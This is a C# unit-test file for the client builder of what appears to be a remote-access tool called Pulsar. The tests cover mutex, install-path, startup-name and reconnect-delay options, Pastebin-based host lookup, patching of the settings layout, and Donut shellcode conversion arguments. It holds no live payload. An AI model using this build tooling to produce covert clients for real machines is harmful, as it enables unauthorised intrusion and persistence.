#if NET9_0_OR_GREATER
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Pulsar.Common;
using Pulsar.Server.Build;
using Pulsar.Server.Helper;
using Pulsar.Server.Models;
using Pulsar.Server.Utilities;
using System;
using System.IO;
using System.Linq;
using ClientSettings = Pulsar.Client.Config.Settings;

namespace Pulsar.Common.Tests.Build
{
    [TestClass]
    public class BuilderCompatibilityTests
    {
        [TestMethod]
        public void VersionsStayConsistent()
        {
            Assert.AreEqual(ProtocolVersion.Current, ServerVersion.Current);
            Assert.AreEqual(ProtocolVersion.Current, ClientSettings.ReportedVersion);
        }

        [TestMethod]
        public void ValidBuildOptionsAreAccepted()
        {
            BuildOptionsValidator.Validate(CreateOptions(), false);
            BuildOptionsValidator.Validate(CreateOptions(".bin"), true);
        }

        [TestMethod]
        public void IncompatibleVersionIsRejected()
        {
            var options = CreateOptions();
            options.Version = "0.0.1";

            Assert.ThrowsException<ArgumentException>(() => BuildOptionsValidator.Validate(options, false));
        }

        [TestMethod]
        public void InvalidPositionalValuesAreRejected()
        {
            var delayOptions = CreateOptions();
            delayOptions.Delay = BuildOptionsValidator.MaximumReconnectDelay + 1;
            Assert.ThrowsException<ArgumentOutOfRangeException>(
                () => BuildOptionsValidator.Validate(delayOptions, false));

            var folderOptions = CreateOptions();
            folderOptions.InstallPath = 99;
            Assert.ThrowsException<ArgumentOutOfRangeException>(
                () => BuildOptionsValidator.Validate(folderOptions, false));
        }

        [TestMethod]
        public void PastebinRequiresHttpUrl()
        {
            var options = CreateOptions();
            options.Pastebin = true;
            options.RawHosts = "not-a-url";

            Assert.ThrowsException<ArgumentException>(() => BuildOptionsValidator.Validate(options, false));
        }

        [TestMethod]
        public void ManifestCannotReplaceArtifact()
        {
            var options = CreateOptions();
            options.ManifestPath = options.OutputPath;

            Assert.ThrowsException<ArgumentException>(() => BuildOptionsValidator.Validate(options, false));
        }

        [TestMethod]
        public void SettingsLayoutValidatesCountsAndOrder()
        {
            using (var assembly = CreateLayoutAssembly(
                       ClientSettingsLayout.StringFields,
                       ClientSettingsLayout.BooleanFields))
            {
                var slots = ClientSettingsLayout.GetInstructions(assembly);
                Assert.AreEqual(ClientSettingsLayout.StringFields.Length, slots.Strings.Length);
                Assert.AreEqual(ClientSettingsLayout.BooleanFields.Length, slots.Booleans.Length);
            }

            var reversed = ClientSettingsLayout.StringFields.Reverse().ToArray();
            using (var assembly = CreateLayoutAssembly(reversed, ClientSettingsLayout.BooleanFields))
            {
                var error = Assert.ThrowsException<InvalidOperationException>(
                    () => ClientSettingsLayout.GetInstructions(assembly));
                StringAssert.Contains(error.Message, "string layout changed");
            }
        }

        [TestMethod]
        public void DonutArgumentsKeepPathsAtomic()
        {
            var input = @"C:\path with spaces\Client.exe";
            var output = @"C:\path with spaces\Client.bin";
            var args = ShellcodeBuilder.BuildArguments(
                input,
                "renamed.Namespace.Program",
                "Main",
                output,
                "",
                EntropyLevel.RandomSymmetric,
                Architecture.Both,
                Format.Binary,
                Compress.None,
                Bypass.None,
                Headers.Overwrite);

            var arguments = args.ToList();
            Assert.IsTrue(arguments.Contains(input));
            Assert.IsTrue(arguments.Contains(output));
            Assert.AreEqual(arguments.IndexOf(input) - 1, arguments.IndexOf("-i"));
            Assert.AreEqual(arguments.IndexOf(output) - 1, arguments.IndexOf("-o"));
        }

        private static BuildOptions CreateOptions(string extension = ".exe")
        {
            return new BuildOptions
            {
                Tag = "TEST",
                Mutex = "test-mutex",
                RawHosts = "127.0.0.1:4783",
                Version = ProtocolVersion.Current,
                InstallSub = "",
                InstallName = "",
                StartupName = "",
                LogDirectoryName = "Logs",
                Delay = 5000,
                InstallPath = 1,
                OutputPath = Path.Combine(AppContext.BaseDirectory, "builder-fixtures", "client" + extension)
            };
        }

        private static AssemblyDefinition CreateLayoutAssembly(string[] strings, string[] booleans)
        {
            var assembly = AssemblyDefinition.CreateAssembly(
                new AssemblyNameDefinition("LayoutFixture", new Version(1, 0)),
                "LayoutFixture",
                ModuleKind.Dll);
            var type = new TypeDefinition(
                "Pulsar.Client.Config",
                "Settings",
                TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.Abstract | TypeAttributes.Sealed);
            assembly.MainModule.Types.Add(type);

            AddFields(type, strings, assembly.MainModule.TypeSystem.String);
            AddFields(type, booleans, assembly.MainModule.TypeSystem.Boolean);
            var delayField = new FieldDefinition("RECONNECTDELAY", FieldAttributes.Public | FieldAttributes.Static, assembly.MainModule.TypeSystem.Int32);
            var folderField = new FieldDefinition("SPECIALFOLDER", FieldAttributes.Public | FieldAttributes.Static, assembly.MainModule.TypeSystem.SByte);
            type.Fields.Add(delayField);
            type.Fields.Add(folderField);

            var cctor = new MethodDefinition(
                ".cctor",
                MethodAttributes.Private | MethodAttributes.Static |
                MethodAttributes.SpecialName | MethodAttributes.RTSpecialName,
                assembly.MainModule.TypeSystem.Void);
            type.Methods.Add(cctor);

            foreach (var field in type.Fields.Where(field => strings.Contains(field.Name)))
            {
                cctor.Body.Instructions.Add(Instruction.Create(OpCodes.Ldstr, ""));
                cctor.Body.Instructions.Add(Instruction.Create(OpCodes.Stsfld, field));
            }

            foreach (var field in type.Fields.Where(field => booleans.Contains(field.Name)))
            {
                cctor.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_0));
                cctor.Body.Instructions.Add(Instruction.Create(OpCodes.Stsfld, field));
            }

            cctor.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4, 5000));
            cctor.Body.Instructions.Add(Instruction.Create(OpCodes.Stsfld, delayField));
            cctor.Body.Instructions.Add(Instruction.Create(OpCodes.Ldc_I4_S, (sbyte)26));
            cctor.Body.Instructions.Add(Instruction.Create(OpCodes.Stsfld, folderField));
            cctor.Body.Instructions.Add(Instruction.Create(OpCodes.Ret));
            return assembly;
        }

        private static void AddFields(TypeDefinition type, string[] names, TypeReference fieldType)
        {
            foreach (var name in names)
                type.Fields.Add(new FieldDefinition(name, FieldAttributes.Public | FieldAttributes.Static, fieldType));
        }
    }
}
#endif
